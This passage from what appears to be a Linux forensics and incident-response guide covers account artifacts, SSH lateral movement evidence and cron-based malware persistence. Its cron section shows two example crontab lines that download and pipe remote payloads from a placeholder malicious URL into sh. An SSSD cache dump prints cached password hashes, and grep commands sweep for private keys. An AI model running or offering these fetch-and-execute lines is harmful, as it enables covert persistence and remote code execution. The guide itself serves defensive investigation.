<p>There exists a number of utility programs that can generate the information listed below such as <code>wbinfo</code> and <code>getent</code>. Since we are interested in forensic evidence artifacts that can be collected and reviewed offline the focus here is to examine the file contents directly. This is also required when we are presented with a disk image of a system and not the live running system.</p>
<h3 id="chapters-07-os_accounts_forensics-unexpected-local-user-accounts"><a class="header" href="#chapters-07-os_accounts_forensics-unexpected-local-user-accounts">Unexpected Local user accounts</a></h3>
<p>Look for unusual user accounts in the <code>/etc/passwd</code> </p>
<pre><code class="language-bash">#!/bin/bash
NI_SHELLS=&quot;/sbin/nologin|/sbin/false|/sbin/true|/bin/sync|/sbin/shutdown|/sbin/halt&quot;

echo &quot;Non Interactive / Service Accounts&quot;
echo &quot;**********************************&quot;
egrep $NI_SHELLS /etc/passwd | cut -d: -f1 

echo &quot;&quot; 
echo &quot;Interactive Users&quot;
echo &quot;*****************&quot;
egrep -v $NI_SHELLS /etc/passwd | cut -d: -f1

echo &quot;&quot; 

</code></pre>
<h5 id="chapters-07-os_accounts_forensics-sample-output"><a class="header" href="#chapters-07-os_accounts_forensics-sample-output">Sample output</a></h5>
<pre><code class="language-bash">
[tlasso@rhel-richmondfc scripts]$ ./list_users.sh 
Non Interactive / Service Accounts
**********************************
bin
daemon
adm
lp
sync
shutdown
halt
mail
operator
games
ftp
nobody
systemd-coredump
dbus
polkitd
avahi
tss
colord
clevis
rtkit
sssd
geoclue
libstoragemgmt
systemd-oom
setroubleshoot
pipewire
flatpak
gdm
cockpit-ws
cockpit-wsinstance
gnome-initial-setup
sshd
chrony
dnsmasq
tcpdump



Interactive Users
*****************
root
tlasso

</code></pre>
<p>The <code>/etc/group</code>, <code>/etc/shadow</code>, <code>/etc/gshadow</code> must be cross referenced to check for any user ids or groups that are not recognized.<br />
This can be sign of an orphaned user account that was not removed correctly. </p>
<h3 id="chapters-07-os_accounts_forensics-account-earliest-activity--deleted-accounts"><a class="header" href="#chapters-07-os_accounts_forensics-account-earliest-activity--deleted-accounts">Account Earliest Activity &amp; Deleted Accounts</a></h3>
<p>The user home directory is created for all interactive users (unless explicitly configured). </p>
<p>Examine the <code>/home/</code> folder for a list of home directories. </p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc ~]$ sudo ls -al /home
total 12
drwxr-xr-x.  5 root      root        84 Jun 14 03:21 .
dr-xr-xr-x. 18 root      root       235 Jun 14 02:26 ..
drwx------. 14 357201109 357200513 4096 Jun 14 03:23 nate@corp.tuxtriage.net
drwx------. 15 tlasso    tlasso    4096 Jun 18 19:25 tlasso
drwx------. 14 357201108 357200513 4096 Jun 14 03:14 tlasso@corp.tuxtriage.net
</code></pre>
<p>Note that in the above example there are two tlasso users. The <code>tlasso</code> user is a local system user while the <code>tlasso@corp.tuxtriage.net</code> is an AD user. </p>
<p>Since one of the first things the system does when a user is created is the creation of the home directory, this information can be approximated to the earliest presense of this user on the host. </p>
<p>If the investigation timelines are outside the earliest activity date, the user account may not be part of the incident. </p>
<p>The <code>Birth time</code> of the folder can be used for this purpose. </p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc ~]$ stat /home/*
  File: /home/nate@corp.tuxtriage.net
  Size: 4096      	Blocks: 8          IO Block: 4096   directory
Device: fd00h/64768d	Inode: 102693422   Links: 14
Access: (0700/drwx------)  Uid: (357201109/ UNKNOWN)   Gid: (357200513/ UNKNOWN)
Context: unconfined_u:object_r:user_home_dir_t:s0
Access: 2023-06-14 03:21:01.790738178 -0400
Modify: 2023-06-14 03:23:10.091326083 -0400
Change: 2023-06-14 03:23:10.091326083 -0400
 Birth: 2023-06-14 03:21:01.790738178 -0400
  File: /home/tlasso
  Size: 4096      	Blocks: 8          IO Block: 4096   directory
Device: fd00h/64768d	Inode: 69333680    Links: 15
Access: (0700/drwx------)  Uid: ( 1000/  tlasso)   Gid: ( 1001/  tlasso)
Context: unconfined_u:object_r:user_home_dir_t:s0
Access: 2023-06-18 19:32:30.473261644 -0400
Modify: 2023-06-18 19:25:15.008942407 -0400
Change: 2023-06-18 19:25:15.008942407 -0400
 Birth: 2023-06-14 02:30:33.307059622 -0400
  File: /home/tlasso@corp.tuxtriage.net
  Size: 4096      	Blocks: 8          IO Block: 4096   directory
Device: fd00h/64768d	Inode: 101569584   Links: 14
Access: (0700/drwx------)  Uid: (357201108/ UNKNOWN)   Gid: (357200513/ UNKNOWN)
Context: unconfined_u:object_r:user_home_dir_t:s0
Access: 2023-06-14 03:11:59.697315839 -0400
Modify: 2023-06-14 03:14:12.457619105 -0400
Change: 2023-06-14 03:14:12.457619105 -0400
 Birth: 2023-06-14 03:11:59.697315839 -0400
</code></pre>
<h3 id="chapters-07-os_accounts_forensics-last-logon-time"><a class="header" href="#chapters-07-os_accounts_forensics-last-logon-time">Last logon time</a></h3>
<p>Compile a comprehensive list detailing the latest logon times for all local accounts by parsing the <code>/var/log/lastlog</code>. </p>
<p>This following script, automates the traversal and data extraction. It reads the <code>lastlog</code> file, usually located at <code>/var/log/lastlog</code>, and iterates over it, decoding the binary data into human-readable format. For each record, it prints out the user ID along with the respective last logon timestamp. </p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding:utf-8 -*-

import struct
import collections
import datetime
import os

LSTLOGSTRUCT = struct.Struct('=l32s256s')
LSTLOGRecord = collections.namedtuple(
    &quot;LLRecord&quot;,
    'time line host'
)

lastlog_path='/var/log/lastlog'


with open(lastlog_path, 'rb') as fp:
    uid = 0
    seekto = 0
    size = LSTLOGSTRUCT.size
    end = os.fstat(fp.fileno()).st_size
    while True:
        fp.seek(seekto, 0)
        bytes = fp.read(LSTLOGSTRUCT.size)
        if not bytes:
            break
        if seekto &gt; end:
            break;
        data = LSTLOGSTRUCT.unpack(bytes)
        time, line, host = data
        time = datetime.datetime.fromtimestamp(time) if time else None
        line = line.strip(b'')
        host = host.strip(b'')
        if time is not None:
            print(&quot;UID: {}. Last Logon: {}. Host: {}. Line:{}&quot;.format( uid, time, host, line))    
        
        uid = uid+1
        seekto = seekto + size
</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc Documents]$ ./test.py
UID: 0. Last Logon: 2023-06-14 02:53:13. Host: b''. Line:b'pts/0'
UID: 42. Last Logon: 2023-07-02 12:04:28. Host: b''. Line:b'tty1'
UID: 1000. Last Logon: 2023-07-02 12:04:37. Host: b''. Line:b'tty2'
</code></pre>
<h3 id="chapters-07-os_accounts_forensics-sssd-cache"><a class="header" href="#chapters-07-os_accounts_forensics-sssd-cache">SSSD Cache</a></h3>
<p>Any user that logs on via AD does not leave much trace on the system maintained files such as <code>/etc/passwd</code> etc. However, there are cache files that are updated as part of the logon process that can be analyzed to detect malicious user activity. </p>
<p>SSSD cache is located at <code>/var/lib/sss/db</code>. </p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc scripts]$ sudo ls /var/lib/sss/db
cache_corp.tuxtriage.net.ldb  ccache_CORP.TUXTRIAGE.NET  config.ldb  sssd.ldb  timestamps_corp.tuxtriage.net.ldb
</code></pre>
<p>Of interest to us is the <code>cache_corp.tuxtriage.net.ldb</code> ldb database. See details about lbd format here <sup class="footnote-reference"><a href="#chapters-07-os_accounts_forensics-ldb">1</a></sup>.</p>
<p><code>ldbsearch</code> command can be used to search this database for records of interest. </p>
<pre><code class="language-bash">tlasso@rhel-richmondfc scripts]$ sudo ldbsearch -H /var/lib/sss/db/cache_corp.tuxtriage.net.ldb
asq: Unable to register control with rootdse!
# record 1
dn: gpoGUID={31B2F340-016D-11D2-945F-00C04FB984F9},cn=gpos,cn=ad,cn=custom,cn=corp.tuxtriage.net,cn=sysdb
gpoGUID: {31B2F340-016D-11D2-945F-00C04FB984F9}
gpoVersion: 3
objectClass: gpo
gpoPolicyFileTimeout: 1686727266
distinguishedName: gpoGUID={31B2F340-016D-11D2-945F-00C04FB984F9},cn=gpos,cn=a
 d,cn=custom,cn=corp.tuxtriage.net,cn=sysdb
...

# record 3
dn: name=tlasso@corp.tuxtriage.net,cn=users,cn=corp.tuxtriage.net,cn=sysdb
createTimestamp: 1686726711
fullName: Ted Lasso
gecos: Ted Lasso
gidNumber: 357200513
name: tlasso@corp.tuxtriage.net
objectCategory: user
uidNumber: 357201108
objectSIDString: S-1-5-21-2369507818-3716282536-1365522936-1108
uniqueID: 5e499899-1305-460b-82d9-87a949f32d18
originalDN: CN=Ted Lasso,CN=Users,DC=corp,DC=tuxtriage,DC=net
originalModifyTimestamp: 20230614062722.0Z
entryUSN: 41335
userPrincipalName: tlasso@CORP.TUXTRIAGE.NET
adAccountExpires: 9223372036854775807
adUserAccountControl: 512
nameAlias: tlasso@corp.tuxtriage.net
isPosix: TRUE
lastUpdate: 1686726711
dataExpireTimestamp: 1686732111
initgrExpireTimestamp: 0
ccacheFile: KCM:
cachedPasswordType: 1
failedLoginAttempts: 0
memberof: name=Domain Users@corp.tuxtriage.net,cn=groups,cn=corp.tuxtriage.net
 ,cn=sysdb
pacBlob:: BwAAAAAAAAABAAAA2AEAAHgAAAAAAAAABgAAABAAAABQAgAAAAAAAAcAAAAQAAAAYAIA
 AAAAAAAKAAAAFgAAAHACAAAAAAAADAAAAKgAAACIAgAAAAAAABAAAAAQAAAAMAMAAAAAAAATAAAAE
 AAAAEADAAAAAAAAARAIAMzMzMzIAQAAAAAAAAAAAgCpHPiCj57ZAf////////9//////////38lSO
 9GiZ7ZASUIWXFSn9kBJchIPIq/2QEMAAwABAACABIAEgAIAAIAAAAAAAwAAgAAAAAAEAACAAAAAAA
 UAAIAAAAAABgAAgABAAAAVAQAAAECAAABAAAAHAACACAAAAAAAAAAAAAAAAAAAAAAAAAAHgAgACAA
 AgAIAAoAJAACACgAAgAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA
 CwAAgAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAB0AGwAYQBzAHMAbwAJAAAAAAAAAAkAAABUAGUAZA
 AgAEwAYQBzAHMAbwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAEAAAABAgAABwAAABAAAAAAAAAADwAAAFcASQBOAC0AVABVAEUAMQBWADIATQBKAEYANQBS
 AAAABQAAAAAAAAAEAAAAQwBPAFIAUAAEAAAAAQQAAAAAAAUVAAAA6tE7jaj4gd34OWRRAQAAADAAA
 gAHAAAAAQAAAAEBAAAAAAASAQAAABAAAABi2JyYFqoO2sq6CcwQAAAACawZ0ByD2C8dtvh8gE5Eq5
 Ce2QEMAHQAbABhAHMAcwBvAAAAMgAYACQAUAACAAAADAB4ABwAiAAAAAAAdABsAGEAcwBzAG8AQAB
 jAG8AcgBwAC4AdAB1AHgAdAByAGkAYQBnAGUALgBuAGUAdAAAAAAAAABDAE8AUgBQAC4AVABVAFgA
 VABSAEkAQQBHAEUALgBOAEUAVAAAAAAAdABsAGEAcwBzAG8AAAAAAAEFAAAAAAAFFQAAAOrRO42o+
 IHd+DlkUVQEAAAAAAAAEAAAAAElgqwi0pz73PmFIhAAAADlOc348iFviKxpfwI=
pacBlobExpireTimestamp: 1686727516
cachedPassword: $6$TuYfJdJ.n2nhNpsA$e8b8IGjnqoNmQCrWlit/Ucn7M2Iie2jq3DwOHEXTIz
 FzY17zamTuy3loYoH/w5DVYqS7t8lM8v6Be2ijrMmLa0
lastCachedPasswordChange: 1686727216
lastOnlineAuth: 1686727216
lastOnlineAuthWithCurrentToken: 1686727216
lastLogin: 1686727216
distinguishedName: name=tlasso@corp.tuxtriage.net,cn=users,cn=corp.tuxtriage.n
 et,cn=sysdb
... 
# record 8
dn: name=nate@corp.tuxtriage.net,cn=users,cn=corp.tuxtriage.net,cn=sysdb
createTimestamp: 1686727258
fullName: Nathan Shelley
gecos: Nathan Shelley
gidNumber: 357200513
name: nate@corp.tuxtriage.net
objectCategory: user
uidNumber: 357201109
objectSIDString: S-1-5-21-2369507818-3716282536-1365522936-1109
uniqueID: a4d7ff67-c14f-4568-b803-b1344d456af8
originalDN: CN=Nathan Shelley,CN=Users,DC=corp,DC=tuxtriage,DC=net
originalModifyTimestamp: 20230614062944.0Z
entryUSN: 41342
userPrincipalName: nate@CORP.TUXTRIAGE.NET
adAccountExpires: 9223372036854775807
adUserAccountControl: 512
nameAlias: nate@corp.tuxtriage.net
isPosix: TRUE
lastUpdate: 1686727258
dataExpireTimestamp: 1686732658
initgrExpireTimestamp: 0
memberof: name=Domain Users@corp.tuxtriage.net,cn=groups,cn=corp.tuxtriage.net
 ,cn=sysdb
pacBlob:: BwAAAAAAAAABAAAA4AEAAHgAAAAAAAAABgAAABAAAABYAgAAAAAAAAcAAAAQAAAAaAIA
 AAAAAAAKAAAAEgAAAHgCAAAAAAAADAAAAJgAAACQAgAAAAAAABAAAAAQAAAAKAMAAAAAAAATAAAAE
 AAAADgDAAAAAAAAARAIAMzMzMzQAQAAAAAAAAAAAgAAAAAAAAAAAP////////9//////////38tnc
 mbiZ7ZAS1dM8ZSn9kBLR0jkYq/2QEIAAgABAACABwAHAAIAAIAAAAAAAwAAgAAAAAAEAACAAAAAAA
 UAAIAAAAAABgAAgAAAAAAVQQAAAECAAABAAAAHAACACAAAAAAAAAAAAAAAAAAAAAAAAAAHgAgACAA
 AgAIAAoAJAACACgAAgAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA
 CwAAgAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAABuAGEAdABlAA4AAAAAAAAADgAAAE4AYQB0AGgAYQ
 BuACAAUwBoAGUAbABsAGUAeQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAABAAAAAQIAAAcAAAAQAAAAAAAAAA8AAABXAEkATgAtAFQAVQBFADEAVgAyAE0ASgBG
 ADUAUgAAAAUAAAAAAAAABAAAAEMATwBSAFAABAAAAAEEAAAAAAAFFQAAAOrRO42o+IHd+DlkUQEAA
 AAwAAIABwAAAAEAAAABAQAAAAAAEgEAAAAAAAAAEAAAANNBR2M9XYa9xX8pNxAAAACF+5OW95HsbT
 4mEPAAwxbGkJ7ZAQgAbgBhAHQAZQAAAAAAAAAuABgAJABIAAIAAAAIAHAAHAB4AAAAAABuAGEAdAB
 lAEAAYwBvAHIAcAAuAHQAdQB4AHQAcgBpAGEAZwBlAC4AbgBlAHQAAABDAE8AUgBQAC4AVABVAFgA
 VABSAEkAQQBHAEUALgBOAEUAVAAAAAAAbgBhAHQAZQABBQAAAAAABRUAAADq0TuNqPiB3fg5ZFFVB
 AAAAAAAABAAAAAiqzSyLHV5O4/3XFsQAAAAMpv8w439cfo71DnY
pacBlobExpireTimestamp: 1686727561
ccacheFile: KCM:
cachedPassword: $6$.9jD7fiamZSK.KjF$IPjQgS76hMIMOjZ2K6/j3HFC7hies1Ezyiuur85cMU
 ZjKSntkCgNcxydyL86uqhpRJk9k7fTfMnkkqcs9xEKb/
cachedPasswordType: 1
lastCachedPasswordChange: 1686727261
failedLoginAttempts: 0
lastOnlineAuth: 1686727261
lastOnlineAuthWithCurrentToken: 1686727261
lastLogin: 1686727261
distinguishedName: name=nate@corp.tuxtriage.net,cn=users,cn=corp.tuxtriage.net
 ,cn=sysdb
...

# returned 14 records
# 14 entries
# 0 referrals
</code></pre>
<p>From the above results, we can locate domain users that have logged on by searching for entries with <code>pacBlob</code> value set. Once the records have been located, various attributes about the user activity can be determined. </p>
<p><code>User Name</code>: This can be located at <code>name</code> as well as <code>nameAlias</code> 
<code>objectSIDString</code>: The windows SID for this user. This is useful to locate activity of this user across other windows systems. 
<code>createTimestamp</code>: The create time for this user 
<code>lastLogin</code>: Last logon timestamp for the user. </p>
<h3 id="chapters-07-os_accounts_forensics-key-users-2"><a class="header" href="#chapters-07-os_accounts_forensics-key-users-2">Key-users <sup class="footnote-reference"><a href="#chapters-07-os_accounts_forensics-key">2</a></sup></a></h3>
<p>The <code>/proc/key-users</code> lists the users with at least one key in the system. It is useful to check this file to see if there are user-ids in this file that were not found anywhere else. 
A user logging off from the system does not automatically clear this file. However this is a cache file and therefore the data will be cleared at some point.</p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc proc]$ cat /proc/key-users 
    0:   113 112/112 79/1000000 1591/25000000
   42:     4 4/4 4/200 34/20000
  997:     1 1/1 1/200 9/20000
 1000:     4 4/4 4/200 46/20000
357201109:     2 2/2 2/200 38/20000
357201111:     4 4/4 4/200 56/20000
</code></pre>
<p>In this example, user with id <code>357201111</code> had logged off the ssh session. </p>
<div class="footnote-definition" id="chapters-07-os_accounts_forensics-ldb"><sup class="footnote-definition-label">1</sup>
<p><a href="https://linux.die.net/man/3/ldb">https://linux.die.net/man/3/ldb</a>
<sup class="footnote-reference"><a href="#chapters-07-os_accounts_forensics-key">2</a></sup>: <a href="https://man7.org/linux/man-pages/man7/keyrings.7.html">https://man7.org/linux/man-pages/man7/keyrings.7.html</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-08-01-lateral_movement"></div><h1 id="chapters-08-01-lateral_movement-lateral-movement"><a class="header" href="#chapters-08-01-lateral_movement-lateral-movement">Lateral movement</a></h1>
<p>Lateral movement refers to the techniques used by attackers to move around the network once they have gained initial access. The attacker may or may not have fully compromized the host with privilige esclation attacks before lateral movement. </p>
<p>SSH lateral movement is typical for linux systems and an easy technique for attackers to exploit. Another attack technique is to use of SSH tunnels to create secure connections between systems and move data between systems without being detected.</p>
<p>It is important to note that there is no single way to detect SSH lateral movement.</p>
<h2 id="chapters-08-01-lateral_movement-ssh-logs"><a class="header" href="#chapters-08-01-lateral_movement-ssh-logs">SSH Logs</a></h2>
<p>The <code>sshd</code> logs are written to the <code>/var/log/secure</code> file. See more details about the <code>secure</code> log file in the Log Analysis section. </p>
<p>As a first step, <code>grep</code> for sshd logs in the <code>secure</code> log file.</p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc log]$ sudo cat secure* | grep sshd
Jul  2 12:02:12 rhel-richmondfc sshd[950]: Server listening on :: port 22.
Jul  2 14:36:34 rhel-richmondfc sshd[6612]: pam_sss(sshd:auth): authentication success; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.26.0.1 user=nate@corp.tuxtriage.net
Jul  2 14:36:34 rhel-richmondfc sshd[6612]: Accepted password for nate@corp.tuxtriage.net from 172.26.0.1 port 56050 ssh2
Jul  2 14:36:35 rhel-richmondfc sshd[6612]: pam_unix(sshd:session): session opened for user nate@corp.tuxtriage.net(uid=357201109) by (uid=0)
Jul  2 23:44:14 rhel-richmondfc sshd[949]: Server listening on 0.0.0.0 port 22.
</code></pre>
<p>From the above snippet, we can observe <code>pam_sss(sshd:auth)</code> - Pluggable Authentication Modules (PAM) using the System Security Services Daemon (SSSD) for the sshd service in the authentication phase. 
The remote host from which the connection is originating is given by the rhost field. 
Once the connection is accepted, the user details, including the uid of the user is logged to this file. </p>
<p>The above log entries can be used to construct an incoming logon session. </p>
<p>Outgoing ssh sessions are unfortunately not logged by default. </p>
<h2 id="chapters-08-01-lateral_movement-ssh-keys"><a class="header" href="#chapters-08-01-lateral_movement-ssh-keys">SSH Keys</a></h2>
<p>SSH keys can provide password less authentication to network resources. However they can be exploited if not properly secured. An attacker who has compromized a host can impersonate the owner if the private keys are not protected. </p>
<h3 id="chapters-08-01-lateral_movement-private-keys"><a class="header" href="#chapters-08-01-lateral_movement-private-keys">Private keys</a></h3>
<p>While presence of private keys does not establish lateral movement, it can establish the attack surface and investigation perimeter. </p>
<p>Use the <code>grep</code> command to look for key files. </p>
<pre><code class="language-bash">grep -ir &quot;BEGIN RSA PRIVATE KEY&quot; /*
grep -ir &quot;BEGIN DSA PRIVATE KEY&quot; /*
</code></pre>
<p>If any keys are found on the system that is being investigated, look for entries in the <code>~/.known_hosts</code> file along with the <code>~/.bash_history</code> and <code>~/.ssh/config</code> files and try to identify the hosts that the attacker may have communicated with. </p>
<h3 id="chapters-08-01-lateral_movement-authorized-keys"><a class="header" href="#chapters-08-01-lateral_movement-authorized-keys">Authorized keys</a></h3>
<p>SSH authorized keys <code>~/ssh/authorized_keys</code> stores the the public key and can be used for paswordless authentication from an attacker machine. This essentially acts as a back door entry. </p>
<h1 id="chapters-08-01-lateral_movement-other-tools"><a class="header" href="#chapters-08-01-lateral_movement-other-tools">Other tools</a></h1>
<p>SSH is not the only lateral movement tool used by attackers. Protocols such as <code>SNMP</code>, Remote desktop protocols such as <code>X window</code>, <code>VNC</code>, <code>Xrdp</code> etc. can also be used. </p>
<div class="footnote-definition" id="chapters-08-01-lateral_movement-ssh_lateral"><sup class="footnote-definition-label">1</sup>
<p><a href="https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/">https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/</a>
<sup class="footnote-reference"><a href="#chapters-08-01-lateral_movement-ssh_aka">2</a></sup>: <a href="https://www.akamai.com/blog/security-research/linux-lateral-movement-more-than-ssh">https://www.akamai.com/blog/security-research/linux-lateral-movement-more-than-ssh</a>
<sup class="footnote-reference"><a href="#chapters-08-01-lateral_movement-red_c">3</a></sup>: <a href="https://redcanary.com/blog/lateral-movement-with-secure-shell/">https://redcanary.com/blog/lateral-movement-with-secure-shell/</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-08-02-lateral_forensics"></div><h1 id="chapters-08-02-lateral_forensics-forensic-artifacts"><a class="header" href="#chapters-08-02-lateral_forensics-forensic-artifacts">Forensic Artifacts</a></h1>
<h2 id="chapters-08-02-lateral_forensics-sshd-logs"><a class="header" href="#chapters-08-02-lateral_forensics-sshd-logs">SSHD Logs</a></h2>
<p><strong>Collect the log files from</strong></p>
<pre><code class="language-bash">/var/log/secure
</code></pre>
<h2 id="chapters-08-02-lateral_forensics-ssh-keys"><a class="header" href="#chapters-08-02-lateral_forensics-ssh-keys">SSH Keys</a></h2>
<p><strong>Collect the keys found on the filesystem</strong></p>
<pre><code class="language-bash">grep -ir &quot;BEGIN RSA PRIVATE KEY&quot; /*
grep -ir &quot;BEGIN DSA PRIVATE KEY&quot; /*
</code></pre>
<p><strong>Collect the SSH Authorized keys from</strong></p>
<pre><code class="language-bash">~/ssh/authorized_keys
</code></pre>
<p><strong>Collect the Known hosts, SSH config, and bash history files for all users</strong></p>
<pre><code class="language-bash">
~/.known_hosts
~/.bash_history
~/.ssh/config
</code></pre>
<h2 id="chapters-08-02-lateral_forensics-other-rat-tools"><a class="header" href="#chapters-08-02-lateral_forensics-other-rat-tools">Other RAT tools</a></h2>
<p>Look for installed applications and find any RAT tools such as </p>
<ul>
<li><code>X Window</code></li>
<li><code>VNC</code></li>
<li><code>Xrdp</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-09-persistence"></div><h1 id="chapters-09-persistence-persistence"><a class="header" href="#chapters-09-persistence-persistence">Persistence</a></h1>
<p>Malware persistence is a technique used by malware to ensure that it remains on a system even after it has been rebooted or the user has logged off. This allows the malware to continue to run and execute its malicious code. Malware persistence is a critical part of many malware attacks. Without persistence, the malware would be easily removed by the user or by security software.</p>
<p>Malware persistence on Linux systems is achieved through a variety of methods, including:</p>
<ul>
<li>
<p><strong>Cron Jobs</strong>: Malware often manipulates cron, the Linux task scheduler, to execute malicious tasks periodically, thus maintaining persistence.</p>
</li>
<li>
<p><strong>Systemd Services</strong>: Linux's system and service manager, systemd, can also be abused by malware to initiate malicious processes at system startup, ensuring malware persistence.</p>
</li>
<li>
<p><strong>Script Modification</strong>: Malware can insert malicious code into commonly executed scripts, such as .bashrc or .bash_profile. Each time the script runs, so does the malware.</p>
</li>
<li>
<p><strong>Kernel Module Manipulation</strong>: Malware with root access can insert malicious kernel modules, enabling it to operate at a low level, beyond the reach of many security measures.</p>
</li>
<li>
<p><strong>Process Injection</strong>: Malware injects its code into a running process, allowing them to gain unauthorized access, manipulate process's behavior, or hide their presense. In addition to this, malware can gain persistence by running everytime the legitimate process runs. </p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-10-1-persistence_cron"></div><h1 id="chapters-10-1-persistence_cron-cron-jobs"><a class="header" href="#chapters-10-1-persistence_cron-cron-jobs">Cron Jobs</a></h1>
<p>Cron is a time-based job scheduler in *nix operating systems. It allows users to schedule commands or scripts to run at specific times or intervals. Cron jobs are often used to automate tasks, such as backups, file maintenance, and software updates. Unfortunately, it can also be leveraged by malicious actors for malware persistence. </p>
<p>There are two executables of note.
<code>crond</code> - this is the deamon program that run in the background and is responsible for executing the cron jobs. <code>crond</code> reads the <code>crontab</code> (cron table) file. The execution schedule is defined in a simple text format and contains the following. <sup class="footnote-reference"><a href="#chapters-10-1-persistence_cron-sand">1</a></sup></p>
<ul>
<li>The time or interval at which the job should run</li>
<li>The command or script that should be run</li>
<li>The user that should run the job</li>
</ul>
<p>These files can be system-wide or user specific. </p>
<h2 id="chapters-10-1-persistence_cron-crontab-file-format"><a class="header" href="#chapters-10-1-persistence_cron-crontab-file-format">Crontab File format</a></h2>
<p>A cron job is defined by a single line in a crontab file, structured as follows: </p>
<pre><code class="language-bash">
* * * * * command-to-be-executed
- - - - -
| | | | |
| | | | ----- Day of the week (0 - 7) (Sunday = 0 or 7)
| | | ------- Month (1 - 12)
| | --------- Day of the month (1 - 31)
| ----------- Hour (0 - 23)
------------- Minute (0 - 59)
</code></pre>
<p>Each field can contain a single number, a comma-separated list of numbers, a range of numbers, or an asterisk (representing all possible numbers).</p>
<p>The second executable is <code>crontab</code> which is used to manage the crontab files. <code>crontab -e</code> can be used to edit the crontab file. </p>
<p><strong>Examples</strong></p>
<pre><code class="language-bash">*/11 * * * * wget -O - -q http://&lt;malicious_url&gt;/pics/logo.jpg|sh

*/5 * * * * curl http://&lt;malicious_url&gt;/malicious.png -k|dd skip=2446 bs=1|sh
</code></pre>
<h3 id="chapters-10-1-persistence_cron-managing-crontab-entries"><a class="header" href="#chapters-10-1-persistence_cron-managing-crontab-entries">Managing crontab entries:</a></h3>
<ul>
<li><code>crontab -l</code> lists the current user's crontab entries.</li>
<li><code>crontab -e</code> opens the user's crontab file for editing.</li>
<li><code>crontab -r</code> removes the user's crontab file.</li>
</ul>
<h2 id="chapters-10-1-persistence_cron-user-crontab-file-locations"><a class="header" href="#chapters-10-1-persistence_cron-user-crontab-file-locations">User Crontab file locations</a></h2>
<p>The crontab files for individual users are stored in the <code>/var/spool/cron</code> directory. Each user's crontab file has the same name as the username.</p>
<p>For example, the crontab file for the <code>cbeard</code> user would be at <code>/var/spool/cron/cbeard</code>.</p>
<p>System-wide cron jobs are also stored in the <code>/etc/crontab</code> file. The <code>/etc/cron.d/</code> directory also stores system-wide cron files, where each file represents a separate cron job.</p>
<h2 id="chapters-10-1-persistence_cron-scheduling-with-anacron"><a class="header" href="#chapters-10-1-persistence_cron-scheduling-with-anacron">Scheduling with anacron</a></h2>
<p><code>anacron</code> is similar to <code>cron</code> in that it is also used for running scheduled tasks<sup class="footnote-reference"><a href="#chapters-10-1-persistence_cron-anacron">2</a></sup>. </p>
<p>The primary difference between anacron and cron is how they handle missed or skipped jobs. In <code>cron</code>, if a system is powered off or inactive at the scheduled time of a task, the task will not be executed. <code>anacron</code> is designed to address this limitation by allowing the execution of missed tasks when the system becomes active again.</p>
<p>System-wide tasks are defined in the main configuration file (<code>/etc/anacrontab</code>), while user-specific tasks are defined in separate per-user configuration files located in <code>/var/spool/anacron/</code></p>
<h2 id="chapters-10-1-persistence_cron-system-crontab-file-locations"><a class="header" href="#chapters-10-1-persistence_cron-system-crontab-file-locations">System Crontab file locations</a></h2>
<p>System packages schedule jobs by placing scripts in the <code>/etc/cron.d</code> folder. </p>
<p><code>/etc/cron.hourly</code>, <code>/etc/cron.daily</code>, <code>/etc/cron.weekly</code>, <code>/etc/cron.monthly</code>: These directories contain scripts that run every hour, day, week, or month, respectively.
Jobs can be scheduled by placing script files in these folder locations. The cron daemon will run the scripts per the schedule. </p>
<h2 id="chapters-10-1-persistence_cron-task-scheduling-using-the-at-command"><a class="header" href="#chapters-10-1-persistence_cron-task-scheduling-using-the-at-command">Task scheduling using the 'at' command</a></h2>
<p>The <code>at</code> command in can be used to schedule one-time tasks or commands to run at a specific time in the future. It is particularly useful for scheduling jobs that need to run only once, without any recurring pattern. </p>
<p>Note that <code>at</code> command job history cannot be recovered as the entry is purged from the job queue after the task execution. </p>
<p>The queue can be inspected as follows </p>
<pre><code class="language-bash">cat /var/spool/at/&lt;job_id&gt;

cat /var/spool/at/spool/&lt;job_id&gt;
</code></pre>
<div class="footnote-definition" id="chapters-10-1-persistence_cron-anacron"><sup class="footnote-definition-label">2</sup>
<p>https://linuxconfig.org/how-to-run-commands-periodically-with-anacron-on-linux
<sup class="footnote-reference"><a href="#chapters-10-1-persistence_cron-sand">1</a></sup>: &lt;
https://sandflysecurity.com/blog/linux-malware-persistence-with-cron/ &gt;</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-10-2-autostart"></div><h1 id="chapters-10-2-autostart-autostart"><a class="header" href="#chapters-10-2-autostart-autostart">Autostart</a></h1>
<p>Autostart mechanisms allow specific applications, services, or scripts to automatically start when the computer boots up or a user logs on. This is a popular vector for malicious actors trying to establish persistence on a compromised system.</p>
<h2 id="chapters-10-2-autostart-systemd-services"><a class="header" href="#chapters-10-2-autostart-systemd-services">Systemd Services</a></h2>
<p><code>systemd</code> is a system and service manager for Linux that is responsible for starting, stopping, and managing system services. 
